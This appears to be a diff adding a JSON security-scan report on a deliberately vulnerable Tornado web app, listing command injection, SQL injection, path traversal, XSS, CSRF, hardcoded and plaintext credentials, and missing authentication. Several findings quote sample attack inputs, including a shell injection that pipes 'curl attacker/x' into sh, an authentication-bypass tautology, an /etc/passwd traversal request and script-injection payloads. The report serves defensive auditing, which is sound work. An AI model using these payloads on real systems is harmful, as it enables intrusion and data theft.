@@ -1,0 +1,580 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "security.injection.command-injection",
+      "path": "server.py",
+      "start": {
+        "line": 125,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 125,
+        "col": 52,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ServerHandler.post() passes the unvalidated 'server' request parameter directly into os.popen('ping -c 3 ' + server), which executes the string through a shell. An attacker can append shell metacharacters (e.g. server=127.0.0.1;id or `curl attacker/x|sh`) to achieve arbitrary OS command execution as the server user. The command output is also rendered back to the attacker, making this a fully interactive RCE.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.injection.sql-injection",
+      "path": "server.py",
+      "start": {
+        "line": 106,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 107,
+        "col": 51,
+        "offset": 0
+      },
+      "extra": {
+        "message": "UsersHandler.post() builds the authentication query by string concatenation of the user-supplied 'username' and 'password' arguments: cur.execute(\"SELECT * FROM Users WHERE User ='\" + uname + \"' AND Password ='\" + pwd + \"'\"). Supplying username=admin'-- or ' OR '1'='1 bypasses authentication entirely and allows extraction/modification of arbitrary database contents. Parameterized queries are not used.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.authentication.sql-injection-auth-bypass",
+      "path": "server.py",
+      "start": {
+        "line": 109,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 112,
+        "col": 62,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The login decision is made solely by whether the concatenated SQL query returned a row (cur_resp). Because the query is injectable (line 106), the authentication check itself can be subverted with a tautology, and no session/secure cookie is ever established for successful logins, so authentication provides no enforceable security state.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.path-traversal.file-read-argument",
+      "path": "server.py",
+      "start": {
+        "line": 77,
+        "col": 21,
+        "offset": 0
+      },
+      "end": {
+        "line": 77,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ContentHandler.get() concatenates the attacker-controlled 'file' query argument into a filesystem path \u2014 io.open(\"read/\" + file_name, 'rb') \u2014 with no canonicalisation, confinement check, or allowlist, and returns the file contents in the response. A request such as /read?file=../../../../etc/passwd discloses arbitrary files readable by the server process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.path-traversal.static-handler",
+      "path": "server.py",
+      "start": {
+        "line": 40,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 47,
+        "col": 34,
+        "offset": 0
+      },
+      "extra": {
+        "message": "StaticHandler serves files from a path built by concatenating the URL-decoded wildcard capture group of r\"/static/(.*)\" ('static/' + path, then os.path.join with the app directory) and writes the file contents to the response. Tornado percent-decodes the path capture and does not remove '..' segments, so a raw request to /static/..%2f..%2f..%2fetc%2fpasswd (or an absolute path, since os.path.join with an absolute second component discards the base) reads files outside the static directory. Tornado's hardened StaticFileHandler, which validates the resolved path against the root, is deliberately not used.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xss.reflected-raw-template",
+      "path": "templates/search.html",
+      "start": {
+        "line": 70,
+        "col": 40,
+        "offset": 0
+      },
+      "end": {
+        "line": 70,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The search term is emitted with Tornado's {% raw %} directive, which explicitly bypasses autoescaping: 'You Searched For: {% raw query %}'. The value comes straight from the 'q' query argument in SearchHandler.get() (server.py:87), so /search?q=<script>alert(1)</script> yields reflected cross-site scripting.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xss.reflected-raw-in-script-context",
+      "path": "templates/search.html",
+      "start": {
+        "line": 71,
+        "col": 26,
+        "offset": 0
+      },
+      "end": {
+        "line": 71,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The same unescaped user input is interpolated inside an inline <script> block as a JavaScript string literal: <script>var x='{% raw link %}';</script>. Even HTML escaping would be insufficient here; with {% raw %} an attacker can break out of the string literal (e.g. /search?q=';alert(document.cookie);//) and execute arbitrary JavaScript in the victim's session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.xss.reflected-user-input-rendered",
+      "path": "server.py",
+      "start": {
+        "line": 87,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 89,
+        "col": 55,
+        "offset": 0
+      },
+      "extra": {
+        "message": "SearchHandler.get() reads the 'q' argument and passes it unsanitised as both 'query' and 'link' to a template that renders it with {% raw %} (templates/search.html:70-71), producing reflected XSS. No output encoding or input validation is applied at the handler level either.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.misconfiguration.xss-protection-disabled",
+      "path": "server.py",
+      "start": {
+        "line": 88,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 88,
+        "col": 51,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The handler explicitly sets 'X-XSS-Protection: 0', disabling the browser's built-in XSS auditor/filter for this response. Combined with the raw template interpolation on the same page, this removes a defence-in-depth control and makes exploitation of the reflected XSS more reliable. No Content-Security-Policy is set anywhere in the application either.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-16: Configuration"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.misconfiguration.debug-mode-enabled",
+      "path": "server.py",
+      "start": {
+        "line": 31,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 27,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The Tornado application is created with \"debug\": True as a hardcoded setting with no environment-based override. Debug mode enables autoreload and, critically, serves full Python tracebacks (including source code fragments, local file paths and configuration details) to remote clients on any unhandled exception \u2014 for example by triggering an IOError in ContentHandler with /read?file=nonexistent. Debug mode must never be active in production.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-489: Active Debug Code"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.error-handling.verbose-error-disclosure",
+      "path": "server.py",
+      "start": {
+        "line": 77,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 79,
+        "col": 25,
+        "offset": 0
+      },
+      "extra": {
+        "message": "File I/O is performed with no exception handling, and because debug mode is enabled (line 31) any resulting IOError/OSError is rendered to the client as a full stack trace containing absolute filesystem paths and application source. This leaks internal implementation details useful for further attacks. StaticHandler (line 46) and UploadHandler (line 66) have the same unguarded I/O.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.auth.missing-authentication-command-execution",
+      "path": "server.py",
+      "start": {
+        "line": 122,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 128,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ServerHandler.post() executes an OS command on behalf of any anonymous client. There is no @tornado.web.authenticated decorator, no get_current_user() implementation anywhere in the application, and no middleware/prepare() hook performing an access check, so this critical function (command execution, exposed on 0.0.0.0:7777) is reachable without authentication or authorization.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.auth.missing-authentication-file-upload",
+      "path": "server.py",
+      "start": {
+        "line": 59,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 69,
+        "col": 58,
+        "offset": 0
+      },
+      "extra": {
+        "message": "UploadHandler.post() accepts and persists arbitrary file content from any unauthenticated client. The application defines no current-user resolution or authorization check (no get_current_user, no prepare() guard, no @authenticated), so anonymous users can write files to the server's filesystem.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.auth.missing-authorization-file-read",
+      "path": "server.py",
+      "start": {
+        "line": 74,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 80,
+        "col": 29,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ContentHandler.get() returns arbitrary file content selected by a request parameter with no authentication and no authorization check on the requested object. Any anonymous client can read documents (and, via traversal, any server file). No ownership, tenant, or role check exists in the request path.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.upload.unrestricted-file-upload",
+      "path": "server.py",
+      "start": {
+        "line": 62,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 68,
+        "col": 27,
+        "offset": 0
+      },
+      "extra": {
+        "message": "UploadHandler derives the stored file's extension directly from the attacker-supplied multipart filename (os.path.splitext(original_fname)[1]) and writes the body to /tmp with no allowlist of permitted extensions or MIME types, no content inspection, and no size limit. Arbitrary file types (.php, .py, .sh, .html) can be planted on the filesystem; the extension is externally controlled and the resulting name is disclosed back to the attacker, so any process or web root that later consumes /tmp can be leveraged for code execution.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.upload.external-control-of-filename",
+      "path": "server.py",
+      "start": {
+        "line": 61,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 66,
+        "col": 62,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The upload target path is assembled as \"/tmp/\" + final_filename, where the extension component comes from the untrusted client-supplied filename with no canonicalisation or character filtering, and the destination directory is a fixed world-writable location rather than a confined, validated upload root. The write destination is therefore partially externally controlled and the file is created with the process's default permissions in a shared directory.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-73: External Control of File Name or Path"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.dos.unbounded-upload",
+      "path": "server.py",
+      "start": {
+        "line": 66,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 68,
+        "col": 27,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Uploaded request bodies are written to disk with no size limit, quota, per-client rate limit, or cleanup of previously stored files, and the handler is unauthenticated. Repeated large uploads let an anonymous attacker exhaust /tmp and the underlying filesystem, denying service to the host. Tornado's max_buffer_size/max_body_size are also left at defaults with the whole body buffered in memory.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.credentials.hardcoded-credentials",
+      "path": "server.py",
+      "start": {
+        "line": 140,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 147,
+        "col": 71,
+        "offset": 0
+      },
+      "extra": {
+        "message": "create_db() seeds the Users table with hardcoded credentials committed to source control, including the administrative account admin/admin and seven further user passwords ('test@123', 'lall0l', 'st40ngp@55', 'D@ni3lDizaark', ...). Anyone with read access to the repository \u2014 or to the shipped test.db \u2014 obtains valid application credentials, including administrator access.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.crypto.plaintext-password-storage",
+      "path": "server.py",
+      "start": {
+        "line": 139,
+        "col": 13,
+        "offset": 0
+      },
+      "end": {
+        "line": 139,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The Users schema stores the Password column as TEXT and passwords are inserted and later compared as cleartext (line 107 compares the submitted password directly against the stored column). No password hashing, salting, or key-derivation function (bcrypt/scrypt/argon2/PBKDF2) is used, so any read of test.db or successful SQL injection immediately yields every user's usable password.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-256: Plaintext Storage of a Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.logging.credentials-in-log",
+      "path": "server.py",
+      "start": {
+        "line": 99,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 99,
+        "col": 74,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The login handler prints the entire raw request body to stdout: print \"POST \", self.request.uri, \"\\nBODY \", self.request.body. For this endpoint the body contains the submitted username and cleartext password, so every login attempt writes valid credentials into the server log/console where they may be captured by log aggregation or read by any user with log access. ServerHandler.post (line 123) logs raw bodies the same way.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.logging.missing-security-event-logging",
+      "path": "server.py",
+      "start": {
+        "line": 109,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 113,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "Failed and successful authentication attempts produce no durable security audit record: the failure branch only sets a message rendered back to the user, and the only output is an unstructured print to stdout that lacks the client IP, timestamp, outcome, and account identifier needed for detection. No logging middleware, prepare() hook, or global handler supplies this elsewhere in the application, so credential-stuffing and brute-force activity against /login.html is undetectable.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-778: Insufficient Logging"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.auth.missing-brute-force-protection",
+      "path": "server.py",
+      "start": {
+        "line": 98,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 108,
+        "col": 40,
+        "offset": 0
+      },
+      "extra": {
+        "message": "UsersHandler.post() performs credential verification with no rate limiting, throttling, CAPTCHA, account lockout, failed-attempt counter, or progressive delay, and there is no middleware, prepare() hook, or gateway layer in the request path that supplies one. An attacker can submit unlimited password guesses against the /login.html endpoint at full request speed.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "security.csrf.xsrf-cookies-disabled",
+      "path": "server.py",
+      "start": {
+        "line": 29,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 10,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The Application settings dict enables only template_path and debug; xsrf_cookies is not set (Tornado defaults to False) and no cookie_secret is configured. Consequently the state-changing POST endpoints /upload (file write), /server.html (command execution), and /login.html accept cross-origin form submissions with no CSRF token validation \u2014 the templates render plain forms with no {% module xsrf_form_html() %}. A victim visiting an attacker page can be forced to trigger server-side command execution.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-352: Cross-Site Request Forgery (CSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
